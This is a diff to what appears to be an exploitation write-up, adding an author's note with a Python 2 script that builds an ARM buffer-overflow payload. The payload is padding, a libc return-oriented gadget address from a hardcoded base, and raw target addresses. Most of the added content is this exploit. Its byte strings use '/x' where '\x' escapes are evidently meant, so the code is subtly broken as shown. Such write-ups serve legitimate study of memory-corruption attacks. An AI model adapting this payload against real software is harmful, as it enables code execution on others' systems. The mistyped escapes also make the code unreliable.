@@ -183,7 +183,19 @@ The issue that I overlooked was that I assumed that the program flow would just 
 ### **[Author's note]**
 
 
-While typing this out, in hindsight, since r4 was pointing, like, 20 bytes away fr
+While typing this out, in hindsight, since r4 was pointing, like, 20 bytes away from my desired function call, I could've just inserted an additional 20 characters of garbage instead. As follows:
+
+	#!/usr/bin/python
+    from struct import pack
+    libc = 0xb6ede000 #Base address of libc
+    
+    payload = 'A' * 132
+    payload += pack('<I', libc + 0x000259d3) #The gadget LDR r0, [SP, #4]
+    payload += 'A' * 4
+    payload += "/x7c/x40/xfb/xb6"
+    payload += 'A' * 24
+    payload += "/x8c/xb4/xf0/xb6"
+    print payload
 
 
 
